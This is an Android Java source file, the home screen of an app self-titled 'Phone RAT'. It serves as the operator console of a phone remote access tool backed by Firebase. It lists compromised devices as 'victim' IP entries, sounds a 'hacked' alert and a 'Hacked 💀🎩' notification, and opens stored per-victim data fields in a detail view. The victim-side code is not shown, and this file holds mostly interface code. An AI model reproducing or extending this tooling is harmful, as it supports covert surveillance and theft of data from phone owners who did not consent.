package com.phonerat.M.Hanfy;

import android.animation.*;
import android.app.*;
import android.app.AlertDialog;
import android.content.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.res.*;
import android.graphics.*;
import android.graphics.Typeface;
import android.graphics.drawable.*;
import android.media.*;
import android.media.MediaPlayer;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.ArrayAdapter;
import android.widget.BaseAdapter;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.blogspot.atifsoftwares.animatoolib.*;
import com.bumptech.glide.Glide;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;

public class HomeActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private FloatingActionButton _fab;
	private String url = "";
	private HashMap<String, Object> mo = new HashMap<>();
	private HashMap<String, Object> map = new HashMap<>();
	private String push_key = "";
	
	private ArrayList<HashMap<String, Object>> mapp = new ArrayList<>();
	
	private LinearLayout linear4;
	private LinearLayout linear2;
	private LinearLayout linear5;
	private LinearLayout linear6;
	private LinearLayout linear7;
	private ImageView imageview1;
	private LinearLayout linear9;
	private TextView textview1;
	private TextView textview5;
	private TextView textview3;
	private ImageView imageview2;
	private LinearLayout linear10;
	private ImageView imageview3;
	private TextView textview7;
	private ListView listview1;
	private TextView textview6;
	
	private Intent telegram = new Intent();
	private TimerTask t;
	private DatabaseReference up = _firebase.getReference("up");
	private ChildEventListener _up_child_listener;
	private MediaPlayer m;
	private FirebaseAuth auth;
	private OnCompleteListener<AuthResult> _auth_create_user_listener;
	private OnCompleteListener<AuthResult> _auth_sign_in_listener;
	private OnCompleteListener<Void> _auth_reset_password_listener;
	private OnCompleteListener<Void> auth_updateEmailListener;
	private OnCompleteListener<Void> auth_updatePasswordListener;
	private OnCompleteListener<Void> auth_emailVerificationSentListener;
	private OnCompleteListener<Void> auth_deleteUserListener;
	private OnCompleteListener<Void> auth_updateProfileListener;
	private OnCompleteListener<AuthResult> auth_phoneAuthListener;
	private OnCompleteListener<AuthResult> auth_googleSignInListener;
	private AlertDialog.Builder d;
	private DatabaseReference PHONERAT = _firebase.getReference("PHONERAT");
	private ChildEventListener _PHONERAT_child_listener;
	private DatabaseReference Fff = _firebase.getReference("Fff");
	private ChildEventListener _Fff_child_listener;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.home);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		_fab = findViewById(R.id._fab);
		linear4 = findViewById(R.id.linear4);
		linear2 = findViewById(R.id.linear2);
		linear5 = findViewById(R.id.linear5);
		linear6 = findViewById(R.id.linear6);
		linear7 = findViewById(R.id.linear7);
		imageview1 = findViewById(R.id.imageview1);
		linear9 = findViewById(R.id.linear9);
		textview1 = findViewById(R.id.textview1);
		textview5 = findViewById(R.id.textview5);
		textview3 = findViewById(R.id.textview3);
		imageview2 = findViewById(R.id.imageview2);
		linear10 = findViewById(R.id.linear10);
		imageview3 = findViewById(R.id.imageview3);
		textview7 = findViewById(R.id.textview7);
		listview1 = findViewById(R.id.listview1);
		textview6 = findViewById(R.id.textview6);
		auth = FirebaseAuth.getInstance();
		d = new AlertDialog.Builder(this);
		
		linear5.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				_anmclk(linear5);
			}
		});
		
		imageview2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				_anmclk(imageview2);
			}
		});
		
		imageview3.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				_anmclk(imageview3);
				_contact_us();
			}
		});
		
		_fab.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (_fab.getRotation()==0) {
					_fab.animate().setDuration(200).rotation(45);
					_Show(true);
				} else {
					_fab.animate().setDuration(200).rotation(0);
					_Show(false);
				};
			}
		});
		
		_up_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if (_childValue.get("upv").toString().length() < textview1.getText().toString().length()) {
					final AlertDialog dialog2 = new AlertDialog.Builder(HomeActivity.this).create();
					View inflate = getLayoutInflater().inflate(R.layout.upd,null); 
					dialog2.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
					dialog2.setView(inflate);
					TextView t1 = (TextView) inflate.findViewById(R.id.t1);
					
					ImageView i5 = (ImageView) inflate.findViewById(R.id.i5);
					
					LinearLayout bg = (LinearLayout) inflate.findViewById(R.id.bg);
					
					LinearLayout l5 = (LinearLayout) inflate.findViewById(R.id.l5);
					
					LinearLayout b2 = (LinearLayout) inflate.findViewById(R.id.b2);
					t1.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/raleway_regular.ttf"), 1);
					_rippleRoundStroke(bg, "#FFFFFF", "#000000", 25, 0, "#FF0000");
					_rippleRoundStroke(b2, "#FFFFFF", "#000000", 25, 0, "#FF0000");
					_rippleRoundStroke(l5, "#FFFFFF", "#000000", 25, 0, "#FF0000");
					_rippleRoundStroke(t1, "#00C853", "#00C853", 44, 0, "#FF0000");
					_radius("#FFFFFF", "#FFFFFF", 0, 0, 0, 25, 25, l5);
					_radius("#FFFFFF", "#FFFFFF", 0, 0, 0, 25, 25, b2);
					i5.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){ 
							dialog2.dismiss();
						}
					});
					t1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){ 
							telegram.setAction(Intent.ACTION_VIEW);
							telegram.setData(Uri.parse(_childValue.get("upl").toString()));
							startActivity(telegram);
						}
					});
					dialog2.setCancelable(false);
					dialog2.show();
				} else {
					
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		up.addChildEventListener(_up_child_listener);
		
		_PHONERAT_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				if ((FirebaseAuth.getInstance().getCurrentUser() != null)) {
					if (_childValue.get("UID").toString().equals(FirebaseAuth.getInstance().getCurrentUser().getUid())) {
						m = MediaPlayer.create(getApplicationContext(), R.raw.hacked);
						m.start();
						PHONERAT.addListenerForSingleValueEvent(new ValueEventListener() {
							@Override
							public void onDataChange(DataSnapshot _dataSnapshot) {
								mapp = new ArrayList<>();
								try {
									GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
									for (DataSnapshot _data : _dataSnapshot.getChildren()) {
										HashMap<String, Object> _map = _data.getValue(_ind);
										mapp.add(_map);
									}
								} catch (Exception _e) {
									_e.printStackTrace();
								}
								Collections.reverse(mapp);
								listview1.setAdapter(new Listview1Adapter(mapp));
								((BaseAdapter)listview1.getAdapter()).notifyDataSetChanged();
							}
							@Override
							public void onCancelled(DatabaseError _databaseError) {
							}
						});
					}
				}
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		PHONERAT.addChildEventListener(_PHONERAT_child_listener);
		
		_Fff_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		Fff.addChildEventListener(_Fff_child_listener);
		
		auth_updateEmailListener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		auth_updatePasswordListener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		auth_emailVerificationSentListener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		auth_deleteUserListener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		auth_phoneAuthListener = new OnCompleteListener<AuthResult>() {
			@Override
			public void onComplete(Task<AuthResult> task) {
				final boolean _success = task.isSuccessful();
				final String _errorMessage = task.getException() != null ? task.getException().getMessage() : "";
				
			}
		};
		
		auth_updateProfileListener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		auth_googleSignInListener = new OnCompleteListener<AuthResult>() {
			@Override
			public void onComplete(Task<AuthResult> task) {
				final boolean _success = task.isSuccessful();
				final String _errorMessage = task.getException() != null ? task.getException().getMessage() : "";
				
			}
		};
		
		_auth_create_user_listener = new OnCompleteListener<AuthResult>() {
			@Override
			public void onComplete(Task<AuthResult> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		_auth_sign_in_listener = new OnCompleteListener<AuthResult>() {
			@Override
			public void onComplete(Task<AuthResult> _param1) {
				final boolean _success = _param1.isSuccessful();
				final String _errorMessage = _param1.getException() != null ? _param1.getException().getMessage() : "";
				
			}
		};
		
		_auth_reset_password_listener = new OnCompleteListener<Void>() {
			@Override
			public void onComplete(Task<Void> _param1) {
				final boolean _success = _param1.isSuccessful();
				
			}
		};
	}
	
	private void initializeLogic() {
		_custom_fab();
		_fab1();
		_fab2();
		_fab3();
		_Show(false);
		if ((FirebaseAuth.getInstance().getCurrentUser() != null)) {
			textview6.setText(FirebaseAuth.getInstance().getCurrentUser().getEmail());
			textview7.setText(FirebaseAuth.getInstance().getCurrentUser().getUid());
		} else {
			telegram.setClass(getApplicationContext(), HostActivity.class);
			startActivity(telegram);
			finishAffinity();
		}
		url = "android.resource://" + getPackageName() + "/drawable/youtubegif";
		Glide.with(getApplicationContext()).load(Uri.parse(url)).into(imageview2);
		t = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						_anmclk(linear5);
					}
				});
			}
		};
		_timer.schedule(t, (int)(800));
		t = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						_anmclk(linear5);
					}
				});
			}
		};
		_timer.schedule(t, (int)(1200));
		t = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						_anmclk(linear5);
					}
				});
			}
		};
		_timer.schedule(t, (int)(1800));
	}
	
	public void _rippleRoundStroke(final View _view, final String _focus, final String _pressed, final double _round, final double _stroke, final String _strokeclr) {
		android.graphics.drawable.GradientDrawable GG = new android.graphics.drawable.GradientDrawable();
		GG.setColor(Color.parseColor(_focus));
		GG.setCornerRadius((float)_round);
		GG.setStroke((int) _stroke,
		Color.parseColor("#" + _strokeclr.replace("#", "")));
		android.graphics.drawable.RippleDrawable RE = new android.graphics.drawable.RippleDrawable(new android.content.res.ColorStateList(new int[][]{new int[]{}}, new int[]{ Color.parseColor(_pressed)}), GG, null);
		_view.setBackground(RE);
	}
	
	
	public void _radius(final String _color1, final String _color2, final double _str, final double _n1, final double _n2, final double _n3, final double _n4, final View _view) {
		android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
		
		gd.setColor(Color.parseColor(_color1));
		
		gd.setStroke((int)_str, Color.parseColor(_color2));
		
		gd.setCornerRadii(new float[]{(int)_n1,(int)_n1,(int)_n2,(int)_n2,(int)_n3,(int)_n3,(int)_n4,(int)_n4});
		
		_view.setBackground(gd);
	}
	
	
	public void _radius_4(final String _color1, final String _color2, final double _str, final double _n1, final double _n2, final double _n3, final double _n4, final View _view) {
		android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
		
		gd.setColor(Color.parseColor(_color1));
		
		gd.setStroke((int)_str, Color.parseColor(_color2));
		
		gd.setCornerRadii(new float[]{(int)_n1,(int)_n1,(int)_n2,(int)_n2,(int)_n3,(int)_n3,(int)_n4,(int)_n4});
		
		_view.setBackground(gd);
		
		android.graphics.drawable.RippleDrawable RE = new android.graphics.drawable.RippleDrawable(new android.content.res.ColorStateList(new int[][]{new int[]{}}, new int[]{ Color.parseColor("#FFFFFF")}), gd, null);
		_view.setBackground(RE);
	}
	
	
	public void _contact_us() {
		final AlertDialog dialog1 = new AlertDialog.Builder(HomeActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.custom2,null); 
		dialog1.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog1.setView(inflate);
		TextView t1 = (TextView) inflate.findViewById(R.id.t1);
		
		TextView t2 = (TextView) inflate.findViewById(R.id.t2);
		
		TextView tk1 = (TextView) inflate.findViewById(R.id.tk1);
		
		LinearLayout b2 = (LinearLayout) inflate.findViewById(R.id.b2);
		
		ImageView i1 = (ImageView) inflate.findViewById(R.id.i1);
		
		ImageView i2 = (ImageView) inflate.findViewById(R.id.i2);
		
		ImageView i3 = (ImageView) inflate.findViewById(R.id.i3);
		
		
		ImageView i5 = (ImageView) inflate.findViewById(R.id.i5);
		
		LinearLayout bg = (LinearLayout) inflate.findViewById(R.id.bg);
		
		LinearLayout ll = (LinearLayout) inflate.findViewById(R.id.ll);
		
		LinearLayout l5 = (LinearLayout) inflate.findViewById(R.id.l5);
		
		TextView t3 = (TextView)
		inflate.findViewById(R.id.t3);
		t1.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/hacked.ttf"), 1);
		t2.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/sansation_regular.ttf"), 0);
		tk1.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/sansation_regular.ttf"), 0);
		t3.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/play.ttf"), 0);
		i1.setImageResource(R.drawable.logo);
		i2.setImageResource(R.drawable.instagram_1);
		i3.setImageResource(R.drawable.instagram_2);
		i5.setImageResource(R.drawable.close);
		t1.setText("Phone RAT");
		t2.setText("By : Mohamed Hanfy ^_•");
		t3.setText("Check my social media");
		_rippleRoundStroke(bg, "#FFFFFF", "#000000", 25, 0, "#000000");
		_rippleRoundStroke(ll, "#000000", "#000000", 0, 0, "#000000");
		_radius_4("#FFFFFF", "#FFFFFF", 0, 100, 100, 100, 100, i5);
		_radius("#FFFFFF", "#FFFFFF", 0, 0, 0, 25, 25, l5);
		_radius("#FFFFFF", "#FFFFFF", 0, 0, 0, 25, 25, b2);
		i5.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){ 
				dialog1.dismiss();
			}
		});
		i2.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){ 
				telegram.setAction(Intent.ACTION_VIEW);
				telegram.setData(Uri.parse("https://t.me/itz_me_aiz"));
				startActivity(telegram);
			}
		});
		i3.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){ 
				telegram.setAction(Intent.ACTION_VIEW);
				telegram.setData(Uri.parse("https://t.me/itz_me_aiz"));
				startActivity(telegram);
			}
		});
		dialog1.setCancelable(false);
		dialog1.show();
	}
	
	
	public void _clickAnimation(final View _view) {
		ScaleAnimation fade_in = new ScaleAnimation(0.9f, 1f, 0.9f, 1f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.7f);
		fade_in.setDuration(200);
		fade_in.setFillAfter(true);
		_view.startAnimation(fade_in);
	}
	
	
	public void _anmclk(final View _view) {
		_clickAnimation(_view);
	}
	
	
	public void _notif(final String _tit, final String _txt) {
		int notifyId = 001;
		NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		Notification.Builder mbuilder = new Notification.Builder(HomeActivity.this);
		mbuilder.setSmallIcon(R.drawable.jjjj);
		mbuilder.setContentTitle(_tit);
		mbuilder.setContentText(_txt);
		mbuilder.setDefaults( Notification.DEFAULT_SOUND | Notification.DEFAULT_VIBRATE);
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			String channelId1 = "1";
			String channelName1 = "channel1";
			NotificationChannel channel = new NotificationChannel(channelId1, channelName1, NotificationManager.IMPORTANCE_DEFAULT);
			channel.enableLights(true);
			channel.setLightColor(Color.BLUE);
			channel.setShowBadge(true);
			channel.enableVibration(true);
			mbuilder.setChannelId(channelId1);
			if (mNotificationManager != null) {
				mNotificationManager.createNotificationChannel(channel);
			}
		} else {
			mbuilder.setDefaults(Notification.DEFAULT_SOUND | Notification.DEFAULT_LIGHTS | Notification.DEFAULT_VIBRATE);
		}
		if (mNotificationManager != null) {
			mNotificationManager.notify(notifyId, mbuilder.build());
		}
	}
	
	
	public void _Remove(final View _view) {
		((ViewGroup)_view.getParent()).removeView(_view);
	}
	
	
	public void _Show(final boolean _Show) {
		if (_Show) {
			bg.setVisibility(View.VISIBLE);
			bg.setTranslationY((int)getDip(50));
			
			
			bg.setAlpha(0);
			
			
			bg.animate().setDuration(200).alpha(1f).translationY(0);
			
			
			_fab.animate().setDuration(200).rotation(45);
		} else {
			bg.setVisibility(View.GONE);
		}
	}
	private LinearLayout bg;
	{
	}
	
	
	public void _SetRadiusToView(final View _view, final double _radius, final String _Colour) {
		android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable(); gd.setColor(Color.parseColor(_Colour)); gd.setCornerRadius((int)_radius); _view.setBackground(gd);
	}
	
	
	public void _fab1() {
		LinearLayout fab1 = (LinearLayout)bg.findViewById(R.id.linear9);
		
		_SetRadiusToView(fab1, (int)getDip(20), "#000000");
		
		fab1.setElevation(8f);
		
		fab1.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				listview1.setVisibility(View.GONE);
				push_key = Fff.push().getKey();
				map = new HashMap<>();
				map.put("puid", textview7.getText().toString());
				Fff.child(push_key).updateChildren(map);
				map.clear();
				t = new TimerTask() {
					@Override
					public void run() {
						runOnUiThread(new Runnable() {
							@Override
							public void run() {
								listview1.setVisibility(View.VISIBLE);
								
							}
						});
					}
				};
				_timer.schedule(t, (int)(2000));
			}});
	}
	
	
	public void _fab2() {
		LinearLayout fab2 = (LinearLayout)bg.findViewById(R.id.linear8);
		
		_SetRadiusToView(fab2, (int)getDip(20), "#000000");
		
		fab2.setElevation(8f);
		
		fab2.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				d.setMessage("هل انت متاكد من الخروج من الجلسة ");
				d.setNeutralButton("نعم", new DialogInterface.OnClickListener() {
					@Override
					public void onClick(DialogInterface _dialog, int _which) {
						FirebaseAuth.getInstance().signOut();
						telegram.setClass(getApplicationContext(), HostActivity.class);
						startActivity(telegram);
						finish();
					}
				});
				d.setNegativeButton("لا", new DialogInterface.OnClickListener() {
					@Override
					public void onClick(DialogInterface _dialog, int _which) {
						
					}
				});
				d.create().show();
			}});
	}
	
	
	public void _fab3() {
		LinearLayout fab3 = (LinearLayout)bg.findViewById(R.id.linear7);
		
		_SetRadiusToView(fab3, (int)getDip(20), "#000000");
		
		fab3.setElevation(8f);
		
		fab3.setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				telegram.setClass(getApplicationContext(), CommentActivity.class);
				startActivity(telegram);
			}});
	}
	
	
	public void _custom_fab() {
		View cv = getLayoutInflater().inflate(R.layout.multiple_fabs, null);
		
		bg = (LinearLayout)cv.findViewById(R.id.linear1);
		
		_Remove(bg);
		
		((ViewGroup)_fab.getParent()).addView(bg);
	}
	
	
	public void _extra() {
		
	}
	
	public class Listview1Adapter extends BaseAdapter {
		
		ArrayList<HashMap<String, Object>> _data;
		
		public Listview1Adapter(ArrayList<HashMap<String, Object>> _arr) {
			_data = _arr;
		}
		
		@Override
		public int getCount() {
			return _data.size();
		}
		
		@Override
		public HashMap<String, Object> getItem(int _index) {
			return _data.get(_index);
		}
		
		@Override
		public long getItemId(int _index) {
			return _index;
		}
		
		@Override
		public View getView(final int _position, View _v, ViewGroup _container) {
			LayoutInflater _inflater = getLayoutInflater();
			View _view = _v;
			if (_view == null) {
				_view = _inflater.inflate(R.layout.cus, null);
			}
			
			final LinearLayout linear2 = _view.findViewById(R.id.linear2);
			final LinearLayout linear4 = _view.findViewById(R.id.linear4);
			final ImageView imageview1 = _view.findViewById(R.id.imageview1);
			final TextView textview1 = _view.findViewById(R.id.textview1);
			final TextView textview2 = _view.findViewById(R.id.textview2);
			
			if (mapp.get((int)_position).get("UID").toString().equals(FirebaseAuth.getInstance().getCurrentUser().getUid())) {
				linear2.setVisibility(View.VISIBLE);
				textview1.setText(mapp.get((int)_position).get("ip").toString());
				_notif("Hacked 💀🎩", "victim ==> ".concat(mapp.get((int)_position).get("ip").toString()));
				linear2.setOnClickListener(new View.OnClickListener() {
					@Override
					public void onClick(View _view) {
						_anmclk(linear2);
						telegram.setClass(getApplicationContext(), ViewActivity.class);
						telegram.putExtra("sm", mapp.get((int)_position).get("sm").toString());
						telegram.putExtra("inf", mapp.get((int)_position).get("inf").toString());
						telegram.putExtra("ip", mapp.get((int)_position).get("ip").toString());
						telegram.putExtra("UID", mapp.get((int)_position).get("UID").toString());
						telegram.putExtra("CoT", mapp.get((int)_position).get("CoT").toString());
						startActivity(telegram);
					}
				});
				_rippleRoundStroke(linear2, "#E0E0E0", "#E0E0E0", 18, 0, "#E0E0E0");
				imageview1.setImageResource(R.drawable.icons_4);
				textview1.setTextColor(0xFF00E676);
			} else {
				linear2.setVisibility(View.GONE);
				_rippleRoundStroke(linear2, "#000000", "#E0E0E0", 18, 0, "#E0E0E0");
				textview1.setText("Lock 🔒");
				imageview1.setImageResource(R.drawable.lock);
				textview1.setTextColor(0xFFFF0000);
			}
			
			return _view;
		}
	}
}